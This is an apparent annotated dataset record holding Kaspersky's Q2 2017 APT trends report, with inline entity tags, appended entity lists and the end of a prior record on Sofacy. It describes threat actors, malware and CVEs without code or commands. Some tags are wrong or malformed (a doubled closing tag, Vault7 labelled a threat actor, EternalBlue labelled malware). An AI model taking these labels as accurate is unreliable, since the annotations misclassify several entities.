OCTOBER 2016;In July;March.16,17,18;August to October;FEBRUARY 2015;APRIL 2015;In February;April 2015;MAY 2014;During the May 2014;JULY 18;AUG 4;EARLY AUG;AUG 10;AUG 25-SEP 12;4 Oct. 2016;6 Oct. 2015;3 Nov. 2016;17 June 2014;2 Jan. 2017;18 November 2015;18 July 2016;5 August 2016;5 Oct. 2016;9 Aug. 2016;11 Aug 2016 10:10 AM;5 Sept. 2016 5:19 AM;Serena Williams;15 Sept. 2016;AUG 9;AUG 11;August 11;SEP 12;SEP 13;SEP 15-30;January 7 2017",Xagent;GAMEFISH;SOURFACE;CORESHELL;CHOPSTICK;webhp;SPLM;fysbis;EVILTOSS;Sedreco;AZZY;ADVSTORESHELL;NETUI;Sednit;Seduploader;JHUHUGIT;OLDBAIT;Sasfis;Carberp,RUSSIA;U.S.;Europe;Soviet Union;Syria;European Union;Poland;Germany;France;Netherlands,,"Guccifer 2.0;Simone Biles;John Podesta;Hillary 
Clinton;John 
Podesta;Colin Powell;Clinton;William Rinehart;Vitaly Mutko;Serena;Venus Williams",,,,,,,,"CVE-2015-1701;CVE-2015-2424;CVE-2015-2590;CVE-2015-3043;CVE-2015-5119;CVE-
2015-7645;CVE-
2016-7855;CVE-2016-7255;CVE-2016-7855",87,12,0,114,63,23,35,0,16,0,0,0,0,0,0,0,9
APT Trends report Q2 2017,"APT Trends report <TIMESTAMP>Q2 2017</TIMESTAMP>


By <ORG>GReAT</ORG>

APT Trends report <TIMESTAMP>Q2 2017</TIMESTAMP>
securelist.com/apt-trends-report-q2-2017/79332

Introduction

<TIMESTAMP>Since 2014</TIMESTAMP>, <ORG>Kaspersky Lab</ORG>’s <ORG>Global Research and Analysis Team</ORG> (<ORG>GReAT</ORG>) has been
providing threat intelligence reports to a wide-range of customers worldwide, leading
to the delivery of a full and dedicated private reporting service. Prior to the new
service offering, <ORG>GReAT</ORG> published research online for the general public in an effort to
help combat the ever-increasing threat from nation-state and other advanced actors. 
Since we began offering a threat intelligence service, all deep technical details on
advanced campaigns are first pushed to our subscriber base. At the same time, to
remain true to our efforts to help make the internet safer, important incidents, such
as <MALWARE>WannaCry</MALWARE> or <MALWARE>Petya</MALWARE> are covered in both private and public reports.

<ORG>Kaspersky</ORG>’s Private Threat Intelligence Portal (TIP)

<TIMESTAMP>In Q1 of 2017</TIMESTAMP> we published our first APT Trends report, highlighting our top research
findings over the last few months. We will continue to publish quarterly reports as a
representative snapshot of what has been offered in greater detail in our private
reports in order to highlight significant events and findings we feel most users should
be aware of.  If you would like to learn more about our intelligence reports or request
more information for a specific report, readers are encouraged to contact:
intelreports@kaspersky.com.

Russian-Speaking Actors

1/8

https://securelist.com/apt-trends-report-q2-2017/79332/
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/08/07172607/APT-report-Q2-2017-1.png
https://securelist.com/apt-trends-report-q1-2017/78169/
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/08/07172602/APT-report-Q2-2017-2.png


<TIMESTAMP>The second</TIMESTAMP> quarter of 2017 has seen multiple incidents involving Russian-speaking
threat actors. Topping the list of ‘attention grabbers’ were the <THREAT_ACTOR>Sofacy</THREAT_ACTOR> and <THREAT_ACTOR>Turla</THREAT_ACTOR> threat
actors.

<TIMESTAMP>March</TIMESTAMP> and <TIMESTAMP>April</TIMESTAMP> started off with a bang, with the discovery of three zero-day exploits
being used in-the-wild by <THREAT_ACTOR>Sofacy</THREAT_ACTOR></THREAT_ACTOR> and <THREAT_ACTOR>Turla</THREAT_ACTOR>: two of these targeted <SOFTWARE>Microsoft Office</SOFTWARE>’s
Encapsulated PostScript (EPS) and the third being a <SOFTWARE>Microsoft Windows</SOFTWARE> Local Privilege
Escalation (LPE).  <THREAT_ACTOR>Sofacy</THREAT_ACTOR> was discovered utilizing both <CVE>CVE-2017-0262</CVE> (an EPS
vulnerability) and <CVE>CVE-2017-0263</CVE> (LPE) over the Easter holiday, targeting a swath of
users throughout <COUNTRY>Europe</COUNTRY>.  Prior to this attack, <THREAT_ACTOR>Turla</THREAT_ACTOR> was also discovered using <CVE>CVE-2017-0261</CVE> (a different EPS vulnerability).  Neither actor appeared to deviate from
their usual payload repertoire, with <THREAT_ACTOR>Sofacy</THREAT_ACTOR> dropping their typical <MALWARE>GAMEFISH</MALWARE> payload
and <THREAT_ACTOR>Turla</THREAT_ACTOR> utilizing what we refer to as <MALWARE>ICEDCOFFEE</MALWARE> (a.k.a. <MALWARE>Shirime</MALWARE>).  Targeting for
these attacks was also directly within the normal wheelhouse for both actors,
focusing mainly on foreign ministries, governments, and other government-affiliated
organizations.

<ORG>GReAT</ORG> produced additional reports on <THREAT_ACTOR>Sofacy</THREAT_ACTOR> and <THREAT_ACTOR>Turla</THREAT_ACTOR> beyond those mentioned
above.  In <TIMESTAMP>April</TIMESTAMP>, we notified customers of two new experimental macro techniques
utilized by <THREAT_ACTOR>Sofacy</THREAT_ACTOR>.  These techniques, while not particularly sophisticated, caught our
attention as they had not been seen before in-the-wild.  The first technique involved
using the built-in ‘<SOFTWARE>certutil</SOFTWARE>’ utility in <SOFTWARE>Microsoft Windows</SOFTWARE> to extract a hardcoded payload
within a macro. The second technique involved embedding Base64-encoded payloads
within the EXIF metadata of the malicious documents.  While the targeting for this
new set of activity was again fairly standard, we discovered some noteworthy
targeting against a <ORG>French political party</ORG> member prior to the <TIMESTAMP>2017</TIMESTAMP> elections.  Moving
into <TIMESTAMP>May</TIMESTAMP> and <TIMESTAMP>June</TIMESTAMP>, we wrote two additional reports of interest involving these two
actors: the first was an update on the long running “<MALWARE>Mosquito Turla</MALWARE>” campaign
showing the usage of fake <SOFTWARE>Adobe Flash</SOFTWARE> installers and continued targeting of foreign
Ministries. The other documented yet another update on <THREAT_ACTOR>Sofacy</THREAT_ACTOR>’s unique <SOFTWARE>Delphi</SOFTWARE>
payload we call ‘<MALWARE>Zebrocy</MALWARE>’.

<TIMESTAMP>June</TIMESTAMP> saw the massive outbreak of a piece of malware dubbed “<MALWARE>ExPetr</MALWARE>”.  While initial
assessments presumed that this was yet another ransomware attack à la <MALWARE>WannaCry</MALWARE>, a
deeper assessment by <ORG>GReAT</ORG> places the initial intent as constituting an operation
destructive in nature.  We were also able to confidently identify the initial distribution
of the malware, as well as indicate a low confidence assessment that the attacks may
share traits with the <MALWARE>BlackEnergy</MALWARE> actors. 

2/8

https://securelist.com/schroedingers-petya/78870/


Below is a summary of report titles produced for the Eastern European region only. 
As stated above, if you would like to learn more about our threat intelligence
products or request more information on a specific report, please direct inquiries to
intelreports@kaspersky.com.

1. <THREAT_ACTOR>Sofacy</THREAT_ACTOR> Dabbling in New Macro Techniques
2. <THREAT_ACTOR>Sofacy</THREAT_ACTOR> Using Two Zero Days in Recent Targeted Attacks – early warning
3. <THREAT_ACTOR>Turla</THREAT_ACTOR> EPS Zero Day – early warning
4. <MALWARE>Mosquito Turla</MALWARE> Targets Foreign Affairs Globally
5. Update on <MALWARE>Zebrocy</MALWARE> Activity <TIMESTAMP>June 2017</TIMESTAMP>
6. <MALWARE>ExPetr</MALWARE> motivation and attribution – Early alert
7. <ATTACK_PATTERN>BlackBox</ATTACK_PATTERN> ATM attacks using SDC bus injection

English-Speaking Actors

English-speaking actors are always particularly fascinating due to their history of
complex tooling and campaigns. Actors like <THREAT_ACTOR>Regin</THREAT_ACTOR> and <THREAT_ACTOR>Project Sauron</THREAT_ACTOR> have proven
fascinating examples of new techniques leveraged in long-lasting, hard to catch
campaigns and as such make ideal subjects for further research. Not to be outdone,
<THREAT_ACTOR>Equation</THREAT_ACTOR> and the <THREAT_ACTOR>Lamberts</THREAT_ACTOR> were the subjects of our most recent investigations.

Continuing our practice of conducting malware paleontology while integrating new
discoveries, we published a report on <MALWARE>EQUATIONVECTOR</MALWARE>, an <THREAT_ACTOR>Equation</THREAT_ACTOR> backdoor first
used <TIMESTAMP>as early as 2006</TIMESTAMP>. This backdoor is a fascinating passive-active shellcode staging
implant. It’s one of the earliest noted instances of a <MALWARE>NObody But US</MALWARE> (‘<MALWARE>NOBUS</MALWARE>’)
backdoor for staging further attacks. Despite its age, the <MALWARE>EQUATIONVECTOR</MALWARE> backdoor
(identified as ‘<MALWARE>PeddleCheap</MALWARE>’ in the latest <THREAT_ACTOR>ShadowBrokers</THREAT_ACTOR> disclosures) incorporates
many advanced techniques for prolonged stealthy operations in victim networks,
allowing the <THREAT_ACTOR>Equation</THREAT_ACTOR> operators to deliver further payloads without arousing
suspicion. The report tracks the development of these tools through subsequent
iterations year-by-year.

3/8



Our tracking of the <THREAT_ACTOR>LAMBERTS</THREAT_ACTOR> toolkit continues with the publication of the <MALWARE>Gray Lambert</MALWARE> report in <TIMESTAMP>June</TIMESTAMP>, the most advanced <MALWARE>Lambert</MALWARE> known to date. This too is a
<MALWARE>NOBUS</MALWARE> backdoor, a passive implant operating strictly in user-land. The intricate
usefulness of <MALWARE>Gray Lambert</MALWARE> lies in its ability to orchestrate multiple sniffer victims on
a network via broadcast, multicast, and unicast commands, allowing the operators to
employ surgical precision in networks with many infected machines. The sniffers
double as next-stage payload delivery mechanisms for an infected network. A notable
feature of the Lambert campaigns is the level of precision with which targets are
chosen; <MALWARE>Gray Lambert</MALWARE>’s victimology is primarily focused on strategic verticals in <COUNTRY>ASIA</COUNTRY>
and <COUNTRY>Middle East</COUNTRY>. During this investigation, <ORG>GReAT</ORG> researchers have also discovered
two additional <THREAT_ACTOR>Lambert</THREAT_ACTOR> families (<MALWARE>Red Lambert</MALWARE> and <MALWARE>Brown Lambert</MALWARE>) currently under
investigation for Q3.  Below is a list of report titles for reference:

1. <MALWARE>EQUATIONVECTOR</MALWARE> – A Generational Breakdown of the <MALWARE>PeddleCheap</MALWARE>
Multifunctional Backdoor

2. The <MALWARE>Gray Lambert</MALWARE> – A Leap in Sophistication to User-land <MALWARE>NOBUS</MALWARE> Passive
Implants

Korean-speaking Actors

Our researchers focusing on attacks with a Korean nexus also had a very busy
quarter, producing seven reports on the <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group and <MALWARE>WannaCry</MALWARE> attacks.  Most
of the reports on <THREAT_ACTOR>Lazarus</THREAT_ACTOR> directly involved a sub-group we refer to as <THREAT_ACTOR>BlueNoroff</THREAT_ACTOR>. 
They are the arm that focuses mainly on financial gain, targeting banks, ATMs, and
other “money-makers”.  We revealed to customers a previously unknown piece of
malware dubbed ‘<MALWARE>Manuscrypt</MALWARE>’ used by <THREAT_ACTOR>Lazarus</THREAT_ACTOR> to target not only diplomatic targets in
<COUNTRY>South Korea</COUNTRY>, but also people using virtual currency and electronic payment sites.
Most recently, ‘<MALWARE>Manuscrypt</MALWARE>’ has become the primary backdoor used by the
<THREAT_ACTOR>BlueNoroff</THREAT_ACTOR> sub-group to target financial institutions.

<MALWARE>WannaCry</MALWARE> also created quite a stir in the second quarter, with our analysts producing
three reports and multiple blog posts on this emerging threat.  What proved most
interesting to us, was the probable linkage to <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group as the source of the
attacks, as well as the origins of the malware.  <ORG>GReAT</ORG> researchers were able to trace
back some of its earliest usage and show that before the ‘<MALWARE>EternalBlue</MALWARE>’ exploit was
added to version 2, <MALWARE>WannaCry</MALWARE> v1 was used in spearphishing attacks months prior. 
Here is a listing of our reports from Q2 on actors with a Korean nexus:

1. <MALWARE>Manuscrypt</MALWARE> – malware family distributed by <THREAT_ACTOR>Lazarus</THREAT_ACTOR>
2. <THREAT_ACTOR>Lazarus</THREAT_ACTOR> actor targets carders
3. <THREAT_ACTOR>Lazarus</THREAT_ACTOR>-linked ATM Malware On the Loose In <COUNTRY>South Korea</COUNTRY>
4. <THREAT_ACTOR>Lazarus</THREAT_ACTOR> targets electronic currency operators
5. <MALWARE>WannaCry</MALWARE> – major ransomware attack hitting businesses worldwide – early alert
6. <MALWARE>WannaCry</MALWARE> possibly tied to the <THREAT_ACTOR>Lazarus</THREAT_ACTOR> <THREAT_ACTOR>APT Group</THREAT_ACTOR>
7. The First <MALWARE>WannaCry</MALWARE> <TECHNIQUE>Spearphish</TECHNIQUE> and Module Distribution

Middle Eastern Actors
4/8



While there wasn’t much high-end activity involving Middle Eastern actors, we did
produce two reports revolving around the use of a zero-day exploit (<CVE>CVE-2017-0199</CVE>). 
The most notable involved an actor we refer to as <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> and their usage of the
exploit in-the-wild prior to its discovery.  We have previously reported on <THREAT_ACTOR>BlackOasis</THREAT_ACTOR>
using other zero-days in the past; <CVE>CVE-2016-4117</CVE> in <TIMESTAMP>May 2016</TIMESTAMP>, <CVE>CVE-2016-0984</CVE> in <TIMESTAMP>June 2015</TIMESTAMP>, and <CVE>CVE-2015-5119</CVE> in <TIMESTAMP>June 2015</TIMESTAMP>.  It is believed that <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> is a customer of
<ORG>Gamma Group</ORG> and utilizes the popular ‘lawful surveillance’ kit <MALWARE>FinSpy</MALWARE>.  Other than the
usage of the exploit, this report was significant because it also showed one of the
earliest known uses of a new version of <MALWARE>FinSpy</MALWARE>, which is still being analyzed by our
researchers.

After the discovery of <CVE>CVE-2017-0199</CVE>, a plethora of threat actors also began to
leverage this exploit in their attacks.  We reported to customers on the usage of this
exploit by a well-known Middle Eastern actor dubbed ‘<THREAT_ACTOR>OilRig</THREAT_ACTOR>’.  <THREAT_ACTOR>OilRig</THREAT_ACTOR> has actively
targeted many organizations in <COUNTRY>Israel</COUNTRY> with the exploit via spearphishes appearing to
originate from well-known doctors within Ben Gurion University.  While their
execution was less than stellar, it highlighted the widespread usage of this exploit
shortly after its discovery.

1. <THREAT_ACTOR>OilRig</THREAT_ACTOR> exploiting <CVE>CVE-2017-0199</CVE> in new campaign
2. <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> using Ole2Link zero day exploit in the wild

Chinese-Speaking Actors

On the Chinese speaking front, we felt it necessary to produce two reports to our
customers.  While Chinese speaking actors are active on a daily basis, not much has
changed and we prefer to avoid producing reports on ‘yet another instance of APTxx’
for the sake of padding our numbers.  Instead we try to focus on new and exciting
campaigns that warrant special attention.

One of those reports detailed a new finding regarding a fileless version of the well-
known ‘<MALWARE>HiKit</MALWARE>’ malware dubbed ‘<MALWARE>Hias</MALWARE>’.  We have reported on <MALWARE>Hias</MALWARE> in the past, and one
of our researchers was finally able to discover the persistence mechanism used,
which also allowed us to tie the activity to an actor we call ‘<THREAT_ACTOR>CloudComputating</THREAT_ACTOR>’.

Another report detailed a new campaign we referred to as ‘<CAMPAIGN>IndigoZebra</CAMPAIGN>’.  This
campaign was targeting former Soviet Republics with a wide swath of malware
including <MALWARE>Meterpreter</MALWARE>, <MALWARE>Poison Ivy</MALWARE>, <MALWARE>xDown</MALWARE>, and a previously unknown malware called
‘<MALWARE>xCaon</MALWARE>’.  This campaign shares ties with other well-known Chinese-speaking actors,
but no definitive attribution has been made at this time.

1. Updated technical analysis of <MALWARE>Hias RAT</MALWARE>
2. <CAMPAIGN>IndigoZebra</CAMPAIGN> – Intelligence preparation to high-level summits in <COUNTRY>Middle Asia</COUNTRY>

Best of the rest

5/8



Sometimes we find new and exciting campaigns or entirely new threat actors to
report to our subscribers without being able to make an immediate or definitive
determination on regional provenance.  Several reports fell into this category in the
last quarter.  ChasingAdder is a report describing a new persistence technique that
hijacked a legitimate WMI DLL for the purposes of loading a malicious payload. This
activity targeted high-profile diplomatic, military, and research organizations
beginning in the <TIMESTAMP>fall of 2016</TIMESTAMP>, but to date we have not been able to pinpoint the
specific actor responsible.

<MALWARE>Demsty</MALWARE> is a new piece of <SOFTWARE>MacOS</SOFTWARE> malware that is targeting University researchers in
<COUNTRY>Hong Kong</COUNTRY>, among others.  At the time of writing, we have a low confidence
assessment that the campaign was conducted by Chinese-speaking actors, and thus
categorize this as ‘Unknown’ until greater evidence comes to light.

<TIMESTAMP>During Q2</TIMESTAMP>, the mischievous <THREAT_ACTOR>ShadowBrokers</THREAT_ACTOR> also continued their regular activities
dumping multiple tools and documentation allegedly stolen from <THREAT_ACTOR>Equation Group</THREAT_ACTOR>. In
<TIMESTAMP>April</TIMESTAMP>, the <THREAT_ACTOR>ShadowBrokers</THREAT_ACTOR> released another dump of information detailing the alleged
targeting of <SOFTWARE>SWIFT</SOFTWARE> service bureaus and other <INDUSTRY>banks</INDUSTRY> by <THREAT_ACTOR>Equation Group</THREAT_ACTOR>.  Since some
of our customers are financial entities, we found it necessary to evaluate the data and
provide an expert’s opinion on the validity of the dump.

Reports in the ‘unknown’ category:

1. <THREAT_ACTOR>ShadowBrokers</THREAT_ACTOR>’ Lost in translation leak – <SOFTWARE>SWIFT</SOFTWARE> attacks analysis
2. ChasingAdder – WMI DLL Hijacking Trojan Targeting High Profile Victims
3. University Researchers Located in <COUNTRY>Hong Kong</COUNTRY> Targeted with <MALWARE>Demsty</MALWARE>

Predictions

Based on the trends we’ve seen over the last three months, as well as foreseeable
geopolitical events, we have listed a few predictions for the upcoming quarter (Q3). As
always, this isn’t an exact science and some cases won’t come to fruition. Analyzing
current and future events and combining those with the motivations of known active
actors can help organizations prepare for likely forthcoming activity:

1. Misinformation campaigns will remain a threat to countries with upcoming
elections, specifically <COUNTRY>Germany</COUNTRY> and <COUNTRY>Norway</COUNTRY>, as they have been previous targets
for Eastern European based actors.

2. ‘Lawful Surveillance’ tools will continue to be utilized by governments that don’t
have well-established Cyber Operations capabilities, mainly based out of the
<COUNTRY>Middle East</COUNTRY>. Companies such as <ORG>Gamma Group</ORG>, <ORG>Hacking Team</ORG>, and <ORG>NSO</ORG> will
continue to offer new zero-day exploits to those customers. As prices increase
and exchanges thrive, new organizations and marketplaces will continue
popping up.

3. Destructive malware disguised as ransomware will continue to be a problem. In
the last quarter we’ve seen two instances of this, and with the continued release
of tools / exploits from dumps like <THREAT_ACTOR>Vault7</THREAT_ACTOR> and <THREAT_ACTOR>ShadowBrokers</THREAT_ACTOR>, this is going to
be a new alarming trend to deal with.

6/8



4. In <COUNTRY>CHINA</COUNTRY>, the past months have been marked by the dwindling economic
growth, rising tensions with <COUNTRY>North Korea</COUNTRY> and the <COUNTRY>US</COUNTRY>, and increased exchanges
between South Korean / Japanese / American organizations. In addition to
these, the 19th Party Congress is set to be held in the <TIMESTAMP>fall of 2017</TIMESTAMP> and according
to multiple public predictions, it is likely that some major changes will happen in
the leadership. It’s possible that these events will have wide regional influences
that could affect the way that threat actors operate in <COUNTRY>ASIA</COUNTRY>, both in terms of
targeting and TTPs.

5. Targeting energy-related companies and organizations will be on the rise.
Countries such as <COUNTRY>Norway</COUNTRY> may be a top target moving forward given their
control on oil and gas in the region in the buildup to an election. Saudi Arabia
will also top the charts for potential targeting as they have in years past.

6. Lower-tier threat actors continue to increase cyber-espionage efforts and
capabilities both in complexity and size. Expect more activity with varied
technical capabilities coming from lesser known or previously unseen actors.

How to keep yourself protected

One of the biggest problems when it comes to leveraging threat intelligence is judging
the quality of the data and how it can be used for defense. For instance, we may
observe an increase in the number of fileless attacks or attacks in which all IOCs are
unique or specific per victim. In such situations, having not only host-based IOCs, but
also network IOCs and Yara rules that can help identify malware in all cases is very
important.

Another problem comes from the fact that many threat intelligence providers have a
limited world view and their data covers only a small set of threats. It’s easy for an
enterprise to fall into the trap of thinking that ‘actor X’ is not something they need to
worry because their focus has been only certain countries or certain industry sectors;
only to discover later that their ignorance left them blind to those attacks.

As shown by many incidents, but especially by <MALWARE>WannaCry</MALWARE> and <MALWARE>ExPetr</MALWARE>’s <MALWARE>EternalBlue</MALWARE>-
based spreading subroutines, vulnerabilities remain a key approach to infecting
systems. Therefore timely patching is of utmost importance – which, being one of the
most tedious IT maintenance tasks, works much better with good automation.
<SOFTWARE>Kaspersky Endpoint Security for Business Advanced</SOFTWARE> and <SOFTWARE>Kaspersky Total Security</SOFTWARE>
include Vulnerability & Patch management components, offering convenient tools for
making patching much easier, and much less time-consuming for IT staff.

Given the above, it is highly recommended that prevention (such as endpoint
protection) along with advanced detection capabilities, such as a solution that can
detect all types of anomalies and scrutinize suspicious files at a deeper level, be
present on users’ systems. The <SOFTWARE>Kaspersky Anti Targeted Attack</SOFTWARE> solution (<SOFTWARE>KATA</SOFTWARE>)
matches events coming from different infrastructure levels, discerns anomalies and
aggregates them into incidents, while also studying related artifacts in a safe
environment of a sandbox. As with most <ORG>Kaspersky</ORG> products, <SOFTWARE>KATA</SOFTWARE> is powered by

7/8



<SOFTWARE>HuMachine Intelligence</SOFTWARE>, which is backed by on premise and in lab-running machine
learning processes coupled with real-time analyst expertise and our understanding of
threat intelligence big data.

The best way to prevent attackers from finding and leveraging security holes, is to
eliminate the holes altogether, including those involving improper system
configurations or errors in proprietary applications. For this, <SOFTWARE>Kaspersky Penetration Testing and Application Security Assessment</SOFTWARE> services can become a convenient and
highly effective solution, providing not only data on found vulnerabilities, but also
advising on how to fix it, further strengthening corporate security.

https://youtu.be/JS4tbSWQb90

8/8

https://youtu.be/JS4tbSWQb90

	APT Trends report <TIMESTAMP>Q2 2017</TIMESTAMP>
	Introduction
	Russian-Speaking Actors
	English-Speaking Actors
	Korean-speaking Actors
	Middle Eastern Actors
	Chinese-Speaking Actors
	Best of the rest
	Predictions
	How to keep yourself protected",Sofacy;Lazarus;Turla;ShadowBrokers;BlackOasis;Equation;OilRig;BlueNoroff;Equation Group;Regin;Project Sauron;Lamberts;LAMBERTS;Lambert;APT Group;CloudComputating;Vault7,Microsoft Windows;SWIFT;KATA;Microsoft Office;certutil;Adobe Flash;Delphi;MacOS;Kaspersky Endpoint Security for Business Advanced;Kaspersky Total Security;Kaspersky Anti Targeted Attack;HuMachine Intelligence;Kaspersky Penetration Testing and Application Security Assessment,banks,GReAT;Kaspersky;Gamma Group;Kaspersky Lab;Global Research and Analysis Team;French political party;Hacking Team;NSO,Q2 2017;April;June;June 2015;Since 2014;In Q1 of 2017;The second;March;2017;May;June 2017;as early as 2006;May 2016;fall of 2016;During Q2;fall of 2017,WannaCry;Gray Lambert;ExPetr;EQUATIONVECTOR;NOBUS;Manuscrypt;Mosquito Turla;Zebrocy;PeddleCheap;EternalBlue;FinSpy;Hias;Demsty;Petya;GAMEFISH;ICEDCOFFEE;Shirime;BlackEnergy;NObody But US;Lambert;Red Lambert;Brown Lambert;HiKit;Meterpreter;Poison Ivy;xDown;xCaon;Hias RAT,ASIA;Middle East;South Korea;Hong Kong;Norway;Europe;Israel;Middle Asia;Germany;CHINA;North Korea;US,,,IndigoZebra,,,,BlackBox,Spearphish,,CVE-2017-0199;CVE-2017-0262;CVE-2017-0263;CVE-2017-0261;CVE-2016-4117;CVE-2016-0984;CVE-2015-5119,51,16,1,16,23,54,17,0,0,2,0,0,0,1,1,0,9
